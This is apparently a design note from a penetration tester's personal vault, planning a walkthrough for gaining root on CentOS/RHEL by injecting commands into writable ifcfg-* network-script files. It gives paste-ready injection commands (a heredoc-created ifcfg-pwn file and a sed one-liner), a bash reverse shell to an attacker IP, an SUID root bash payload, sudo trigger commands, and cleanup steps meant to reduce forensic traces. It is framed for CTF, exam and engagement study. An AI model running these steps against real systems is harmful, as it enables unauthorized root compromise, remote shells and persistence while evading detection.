## Purpose and status

Design specification for a new `[[ifcfg NAME Injection]]` walkthrough — exploitation of writable `/etc/sysconfig/network-scripts/ifcfg-*` files on CentOS/RHEL/legacy Fedora targets. Preserves the deliberated design from the session where the ifcfg-* narrow-applicability vector was investigated as part of Cluster G Step 16 work. The walkthrough itself is deferred to first real-target encounter — no walkthrough file exists at time of writing; LPEC Step 16's ifcfg-* sub-block routes here for the exploitation specification when detection markers fire.

**Status: build-when-encountered.** The vector applies only when network-scripts are present on target (CentOS/RHEL 6-8, legacy Fedora) AND foothold has write access to at least one ifcfg-* file or to the containing directory. Hit rate is near-zero on modern Linux (RHEL 9+ removed network-scripts entirely; Debian/Ubuntu never used them); non-zero on legacy CentOS/RHEL production boxes and CTF/HTB boxes deliberately configured to test this vector (canonical example: HTB Networked).

**When to consult this note and build:** at the first encounter with a target where LPEC Step 16's ifcfg-* sub-block emitted `IFCFG_WRITABLE: <file>` OR `IFCFG_DIR_WRITABLE: <dir>` markers, indicating a viable injection point exists.

**Related in-vault artefacts (applied this session — do not re-apply):**

- LPEC Step 16 new sub-block "ifcfg-* NAME injection (CentOS/RHEL network-scripts)": presence check (`test -d /etc/sysconfig/network-scripts`) → writability enumeration via `find -L ... -writable` for files, `test -w` for containing directory → route to this design note on any hit.

**Not yet applied — this build's deliverables:**

- `[[ifcfg NAME Injection]]` walkthrough per specification below.
- Real-target validation on a CentOS/RHEL 6-8 target with writable ifcfg-* configuration.

---

## Motivation — what LPEC Step 16 catches, what walkthrough handles

Step 16 sub-block scope:
- Detect presence of `/etc/sysconfig/network-scripts/`.
- Detect foothold-writable `ifcfg-*` files within (including symlinked-writable targets via `-L`).
- Detect writability of the containing directory (allowing new-file injection).
- Route to walkthrough on any positive marker.

Walkthrough scope (this design):
- Choose injection strategy (in-place inject existing file vs create new file).
- Craft injection payload (which key to inject into, what command to execute).
- Acquire trigger (sudo ifup, sudo NetworkManager control, DHCP renewal, or passive wait).
- Verify root code execution.
- Cleanup (restore original file, remove artifacts).

---

## Verified facts — primary sources

Verified during 2026-08-05 design session.

### Vulnerability mechanism

Files at `/etc/sysconfig/network-scripts/ifcfg-<interface>` are sourced by shell (bash) as part of interface bring-up. This is intentional design — the files use POSIX shell syntax for `KEY=value` assignments and were designed to be sourced.

The vulnerability: shell interprets `KEY=value` semantics literally. If value contains an unquoted space, bash treats the token after the space as a command to execute.

Concrete example — an `ifcfg-eth0` file with injection contains lines like `DEVICE=eth0`, `BOOTPROTO=dhcp`, `NAME=eth0 /bin/id`, `ONBOOT=yes`. When bash sources this file: `DEVICE` set to `eth0`; `BOOTPROTO` set to `dhcp`; `NAME` set to `eth0`; then `/bin/id` executed as root (because ifup runs as root); then `ONBOOT` set to `yes`.

**Injection points:** any assignment. `NAME=` is the canonical example in write-ups because it's the field most likely to be user-controlled by admin scripts (HTB Networked's `changename.sh` prompts for NAME). But `DEVICE=`, `TYPE=`, `BOOTPROTO=`, or any other assignment key is equally exploitable.

### Trigger paths

Root execution requires one of:

1. **`ifup <interface>` invocation** — direct trigger; runs as root; requires foothold to have sudo `ifup` entitlement or root-adjacent access.
2. **NetworkManager dispatcher.d** — NetworkManager sources ifcfg files on network events. If NetworkManager is running and manages the interface, events (link up/down, DHCP renewal) trigger sourcing.
3. **DHCP renewal via `dhclient`** — if foothold has entitlement to run dhclient, forced renewal triggers.
4. **Passive: interface flap / reboot / DHCP lease expiry** — no attacker action needed; injection fires on next network event.

Priority for exam / active-engagement use: 1 > 2 > 3 > 4. Passive triggers are time-bounded and not exam-suitable, but useful on real engagements where operator can wait.

### Distros affected

- **CentOS/RHEL 6, 7:** full network-scripts deployment (default).
- **RHEL 8:** deprecated but available as legacy fallback (requires `network-scripts` package install).
- **RHEL 9:** removed entirely; NetworkManager keyfile format only.
- **Fedora:** followed similar timeline to RHEL.
- **Debian/Ubuntu:** NEVER used network-scripts. Use ifupdown, netplan, or NetworkManager keyfile format instead.

Detection at LPEC Step 16 filters correctly via `test -d /etc/sysconfig/network-scripts` — the directory doesn't exist on non-affected distros.

### CVE status

No specific CVE for the base "value-with-space-executes" vulnerability. Red Hat's position: sourcing behaviour is intended by design; the vulnerability is write-access misconfiguration by admins. Related but distinct CVEs address specific variants. CVE-2011-3364 (Red Hat Bugzilla 737338) addressed newline injection in NetworkManager's ifcfg-rh connection name specifically; general space-injection remained.

The general "space-in-value-executes-as-root" is a design-level property that Red Hat has repeatedly declined to treat as a vulnerability. Correct posture is to protect ifcfg-* file write permissions.

### Reference sources

- HackTricks Linux Privilege Escalation — network-scripts section (community reference).
- HTB Networked write-up (David Hamann, 4 Dec 2019) — https://davidhamann.de/2019/12/04/htb-writeup-networked/ — canonical exam-style exploitation via sudo-permitted script.
- Full Disclosure April 2019 — Marc Stevens' "Redhat/CentOS root through network-scripts" — https://seclists.org/fulldisclosure/2019/Apr/24.
- Red Hat Bugzilla 737338 — CVE-2011-3364 NetworkManager newline injection variant.

---

## Design decisions — rationale-preserving

### Why a dedicated walkthrough, not extension of existing

**Considered:** could this fit as a sub-block extension of any existing walkthrough — `[[Writable Passwd]]`, `[[Writable Shadow]]`, or a "writable-config-file-executes-as-root" generic walkthrough?

**Rejected.** The ifcfg-* injection mechanism (bash sourcing of `KEY=value` files with space injection) is materially different from `/etc/passwd` hash injection and `/etc/shadow` hash cracking. Different trigger (network event / `ifup` vs `su`). Different payload construction (arbitrary shell command vs formatted hash line). Different verification (root cmd exec vs `su root`). Different cleanup requirements (restore original config vs cleanup hash line).

Per V_S walkthrough split-vs-unify: propagating fork across trigger, payload, verification, and cleanup → split into dedicated walkthrough.

**Also considered:** unify with a hypothetical `[[Writable Sudoers]]` walkthrough (as another "writable-config-file-executes-as-root" pattern). **Rejected:** sudoers is parsed by the sudo binary using its own grammar, not shell-sourced. Different exploit chain entirely.

Dedicated `[[ifcfg NAME Injection]]` walkthrough is the correct home.

### Two injection strategies — file vs directory

The Step 16 sub-block emits two possible markers:

- `IFCFG_WRITABLE: <file>` — an existing ifcfg-* file is writable; inject into it.
- `IFCFG_DIR_WRITABLE: <dir>` — the directory itself is writable; create a new `ifcfg-<name>` file with injection.

Walkthrough handles both. Trade-offs:

- In-place injection (file writable): stealthier — no new file artifact for casual `ls`. Risk: breaks existing interface config if the file is actively in use; may cause the interface to fail to come up, defeating the trigger.
- New-file injection (dir writable): safer — doesn't disturb existing interface. Leaves a new file artifact visible in `ls`. Requires the new interface to be brought up (via `ifup <newname>` or via presence-in-directory triggering NetworkManager rescan).

Both branches specified in walkthrough Step 1a and Step 1b.

### Trigger acquisition priority

Priority order specified in walkthrough Step 3, from highest reliability to lowest:

1. **Sudo `ifup` entitlement.** `sudo -l | grep -i ifup`. Terminal-on-hit — direct root execution of injection. Canonical HTB Networked case.
2. **Sudo NetworkManager control.** `sudo systemctl reload NetworkManager` or `sudo nmcli connection reload`. Triggers dispatcher.d hooks.
3. **DHCP renewal.** `dhclient -r && dhclient` if entitled — forces interface event.
4. **Passive: wait.** No attacker action; injection fires on next network event (admin flap, reboot, DHCP lease expiry). Time-bounded.

Options 1-3 are active triggers. Option 4 is passive — real-engagement suitable, not exam-suitable.

### Verification — explicit id per V_S line 142

Injection payload writes proof to a file, then foothold reads the file to verify. Following V_S line 142's "explicit `id` verification with output-keyed branches":

Injection embeds `id > /tmp/pwn.txt && chmod 666 /tmp/pwn.txt` — root's `id` output written to a foothold-readable file. Then post-trigger, foothold runs `cat /tmp/pwn.txt` and routes on output — `uid=0(root) ...` confirms root code execution; no output or `No such file` means trigger did not fire.

Also documented in walkthrough: SUID-root bash payload as an alternative verification-plus-persistence approach.

### Cleanup — restore original file

Cleanup requirement: injection persists in the file. On next network event, the injected command re-executes. That's persistence, but also a forensic artifact and re-execution risk.

Walkthrough Step 5 specifies: before injection (Step 1a), copy the original file to attacker-recoverable location (e.g. `/tmp/original.ifcfg`); post-root, restore original via `cp /tmp/original.ifcfg <file>`; for Step 1b (new-file case), `rm <dir>/ifcfg-pwn`.

Note that file modification times remain visible in forensic audit. Full evidence-scrubbing is out of scope for LPEC walkthroughs — the walkthrough restores functional state, not chain-of-custody state.

---

## Proposed walkthrough structure

Save the built walkthrough to `Linux PrivEsc/Techniques/ifcfg NAME Injection.md`. Structure follows the standard vault shape (hard preconditions header, numbered steps with paste-ready single-line commands, verify with `id`, cleanup, Decision, Validation) — matching precedents in `[[Writable Passwd]]`, `[[Sudo Shell Escape]]`, and other technique walkthroughs.

### Header — Hard preconditions

Prose bullets stating three hard preconditions:

- Target has `/etc/sysconfig/network-scripts/` present (CentOS/RHEL 6-8, legacy Fedora; NOT RHEL 9+, NOT Debian/Ubuntu).
- Foothold has write access to at least one `ifcfg-*` file OR to the `/etc/sysconfig/network-scripts/` directory.
- A trigger path exists: sudo `ifup` entitlement, sudo NetworkManager control, DHCP renewal capability, OR willingness to wait for passive network event.

Note: non-terminal on trigger absence — if trigger cannot be actively acquired, injection persists and fires on next network event (reboot, admin interface flap, DHCP lease expiry). Real engagement viable; exam not suitable for passive-only cases.

### Step 1 — Choose injection strategy

Two-branch step based on which LPEC Step 16 marker fired.

**Step 1a — In-place injection (IFCFG_WRITABLE marker).** Foothold-writable ifcfg-* file at `<file>` from LPEC Step 16 marker output. On target: read original with `cat <file>`; copy for cleanup with `cp <file> /tmp/original.ifcfg`. Proceed to Step 2 with `<file>` as target for injection.

**Step 1b — New-file injection (IFCFG_DIR_WRITABLE marker).** Directory writable at `<dir>` from LPEC Step 16 marker output. On target: create new ifcfg file with injection embedded via heredoc:

```bash
cat > <dir>/ifcfg-pwn <<'EOF'
DEVICE=pwn0
BOOTPROTO=static
ONBOOT=no
NAME=pwn0 id > /tmp/pwn.txt && chmod 666 /tmp/pwn.txt
EOF
```

Set `DEVICE` and `BOOTPROTO` to non-conflicting values to avoid disturbing existing interfaces. `ONBOOT=no` prevents auto-configuration on unrelated network events. `NAME=` carries the injection. Proceed to Step 3.

### Step 2 — Craft injection payload (Step 1a case only)

Choose injection key. `NAME=` is canonical; any assignment works. Sed one-liner to modify existing `NAME=` line in place:

```bash
sed -i 's|^NAME=.*|NAME=eth0 id > /tmp/pwn.txt \&\& chmod 666 /tmp/pwn.txt|' <file>
```

Space between `eth0` and `id` is critical — bash tokenises whitespace and executes the second token onward as a command.

Alternative payloads (substitute the injected command in place of `id > /tmp/pwn.txt ...`):

- Reverse shell: `bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1`
- SUID root bash: `cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash`

Proceed to Step 3.

### Step 3 — Trigger acquisition

Priority order — attempt each in sequence until trigger fires.

**Trigger 1: Sudo ifup entitlement.** Check with `sudo -l 2>/dev/null | grep -Ei 'ifup|(ALL)'`. If line matches: for Step 1a case run `sudo /sbin/ifup <interface_from_file>`; for Step 1b case run `sudo /sbin/ifup pwn0`. Proceed to Step 4. If no match, try Trigger 2.

**Trigger 2: Sudo NetworkManager control.** Check with `sudo -l 2>/dev/null | grep -Ei 'systemctl.*NetworkManager|nmcli'`. If line matches: run `sudo systemctl reload NetworkManager` OR `sudo nmcli connection reload`. Proceed to Step 4. If no match, try Trigger 3.

**Trigger 3: DHCP renewal.** Check with `sudo -l 2>/dev/null | grep -Ei 'dhclient'`. If line matches: run `sudo dhclient -r && sudo dhclient`. Proceed to Step 4. If no match, try Trigger 4 (passive).

**Trigger 4: Passive wait.** No attacker action. Injection fires on next reboot, admin interface flap (`ifdown` + `ifup` from root session), DHCP lease expiry (varies minutes to hours), or NetworkManager rescan event. Real engagement: check periodically for `/tmp/pwn.txt` presence. Exam: NOT SUITABLE — not deterministic within exam time budget.

### Step 4 — Verify

On target: `cat /tmp/pwn.txt 2>/dev/null`. Route on output:

- `uid=0(root) gid=0(root) ...` → root code execution confirmed. Continue to next-step payload OR cleanup.
- File absent OR empty → trigger did not fire OR injection did not execute. Investigate: check trigger command succeeded (no error output); check injection syntax in the ifcfg-* file via `cat <file>` from foothold-readable copy; retry trigger if applicable.

If SUID bash payload was used instead: `ls -la /tmp/rootbash`. If output shows `-rwsr-sr-x root root` → SUID root bash present. Run `/tmp/rootbash -p` then verify with `id` → `uid=0(root)` → interactive root shell. Proceed to Decision.

### Step 5 — Cleanup (post-root)

Restore original state to prevent re-execution on next network event and reduce forensic signal.

For Step 1a case (in-place injection): `cp /tmp/original.ifcfg <file>`. Verify restoration with `diff /tmp/original.ifcfg <file>` — no output means restoration successful.

For Step 1b case (new-file injection): `rm <dir>/ifcfg-pwn`. Verify removal with `ls <dir>/ifcfg-pwn 2>&1` — `No such file or directory` means removal successful.

SUID and artefact cleanup: `rm /tmp/rootbash /tmp/pwn.txt /tmp/original.ifcfg`.

Note: file modification timestamps remain visible in `stat` output — full timestamp restoration requires `touch -r` from a preserved reference. Out of scope for LPEC — walkthrough restores functional state, not forensic-invisible state.

### Decision

Root code execution achieved. Next steps are goal-dependent:

- Credential extraction (root hash, SSH keys, app secrets) → `[[Linux Credential Extraction Checksheet]]`
- Persistence (SSH key, cron, systemd) → `[[Linux Persistence Checksheet]]`
- Lateral movement → `[[Linux Lateral Movement Checksheet]]`

### Validation

HTB:Networked (user `guly` → root via `changename.sh` sudo entitlement + ifcfg-guly NAME injection with `bash -i` payload). Real-target validation on a live CentOS/RHEL 6-8 target remains outstanding at Design Note time.

---

## Alternative approaches considered and rejected

Preserved so future build does not re-litigate.

1. **Extend `[[Writable Passwd]]` or `[[Writable Shadow]]`.** Rejected: different mechanism (bash sourcing vs hash line injection); different trigger, payload, verification, and cleanup. Propagating fork per V_S split-vs-unify → separate walkthrough warranted.
2. **Unify with a hypothetical `[[Writable Sudoers]]` walkthrough as "writable-config-file-executes-as-root".** Rejected: sudoers is parsed by the sudo binary using its own grammar (visudo rules); not shell-sourced. Different exploit chain entirely; no meaningful overlap.
3. **Extend `[[Cron File Permissions]]` (as another "writable-file-executes-as-root").** Rejected: cron trigger is time-based and deterministic (fires on schedule); ifcfg trigger is event-based (network events). Different trigger acquisition strategies; different walkthrough shape.
4. **Handle only `NAME=` injection.** Rejected: any `KEY=value` assignment is equally vulnerable. Documenting only `NAME=` would leave a coverage gap for admin scripts that let users edit other fields (e.g. `DEVICE=` or `BOOTPROTO=`).
5. **Skip file-vs-directory branching in walkthrough (unify to single strategy).** Rejected: Step 16 emits two materially different markers with different exploitation strategies. In-place injection risks breaking existing interface; new-file injection requires bringing the new interface up. Both branches needed.
6. **Sub-block detects trigger availability inline (check `sudo -l` for ifup).** Rejected: sub-block scope is presence + writability detection only. Trigger acquisition is walkthrough scope. Keeps sub-block focused on the LPEC "detect vector" shape; walkthrough handles multi-step exploitation.

---

## Session provenance

**Design session date:** 2026-08-05.

**Primary sources verified during design session:**
- HackTricks Linux Privilege Escalation reference — network-scripts section.
- HTB Networked write-up (David Hamann, 4 Dec 2019) — https://davidhamann.de/2019/12/04/htb-writeup-networked/.
- Full Disclosure April 2019 — Marc Stevens' "Redhat/CentOS root through network-scripts" — https://seclists.org/fulldisclosure/2019/Apr/24.
- Red Hat Bugzilla 737338 — CVE-2011-3364 NetworkManager newline injection variant.

**Sandbox verification scope during design session:**
- Detection command syntax verified across three scenarios: writable file present, all read-only, dir absent. All emit expected markers.
- Symlink edge case verified: default `find` (without `-L`) misses symlinked-writable targets; `find -L` correctly follows and reports them. `-L` retained in sub-block for defence-in-depth.
- Sandbox limitations: ran as root, so `-writable` results reflect root perspective. Real target: foothold's non-root perspective via `access()` syscall. Actor-perspective test correct in principle.
- `ifup <interface>` actual trigger behaviour NOT verified — sandbox lacks network-scripts. Assumption: standard network-scripts installations source ifcfg files via bash. Flag for real-box verification on first encounter.
- NetworkManager dispatcher.d actual trigger behaviour NOT verified — same reason. Assumption: NetworkManager sources ifcfg files on managed-interface events. Flag for real-box verification.

**Correction history preserved for regression prevention:**

- Initial marker variable naming used `<path>` for both markers. Corrected: `<file>` for `IFCFG_WRITABLE` marker (value is a file path), `<dir>` for `IFCFG_DIR_WRITABLE` marker (value is a directory path). Consistent with SSH Keys `<file>` and Logrotate `<config>` naming precedents — placeholder names describe the value's kind, not just repeat the marker name.
- Initial sub-block terminator was "proceed to next narrow-vector check." Corrected: "proceed to Step 17." ifcfg-* is the last narrow-vector sub-block in Step 16 at time of writing; no next narrow-vector check exists. Future insertions of additional narrow-vector sub-blocks after ifcfg-* would require re-updating the terminator.
- Initial design note (v1) used nested markdown code fences with H2/H3 headers inside, plus a multi-line command wrapped in single backticks (invalid markdown syntax that spans lines). Obsidian's parser broke on the multi-line backtick and rendered subsequent content incorrectly. Corrected in v2 by removing nested fences entirely — steps described in prose, multi-line commands in top-level ` ```bash ``` ` fences, single-line commands as inline code. Regression-preventing rule: design notes must not use markdown code fences containing H2/H3 headers, and must not use single backticks spanning multiple lines.

**F&R contents applied this session:**

The following F&R was applied to `Linux PrivEsc/Linux Privilege Escalation Checksheet.md`. The exact Find and Replace strings are captured in the session chat transcript. Summary: inserted the ifcfg-* sub-block into LPEC Step 16 immediately after the DOAS sub-block and before the Step 17 (Kernel exploits) header. Sub-block contents include the presence check command (`test -d /etc/sysconfig/network-scripts && find -L ... -writable ...; test -w ...`) and the three-branch marker routing described in the Motivation and Verified Facts sections above.

**Deferred to build-when-encountered:**

- `[[ifcfg NAME Injection]]` walkthrough per Section "Proposed walkthrough structure" above.
- Real-target validation on CentOS/RHEL 6-8 target with writable ifcfg-* configuration.

**V_S convention grounding:**

- Walkthrough split-vs-unify rule (propagating fork — trigger, payload, verification, cleanup all differ from adjacent walkthroughs → distinct walkthrough warranted).
- Marker naming convention (`<file>`, `<dir>` name the value's kind, consistent with SSH Keys / Logrotate precedents).
- Verification commands are explicit (`id` output-keyed branch per V_S line 142).
- Payload-driven, algorithmic, binary-decision commands (each Step's action pasteable single-line).
- Build-when-encountered convention.
- Design Notes top-level directory convention (established Root-owned Services session; applied here as third design note this session).
- Design note formatting discipline: no nested code fences with H2/H3 headers inside; no single-backtick multi-line commands. Multi-line commands use top-level triple-backtick fences; single-line commands use inline single backticks.
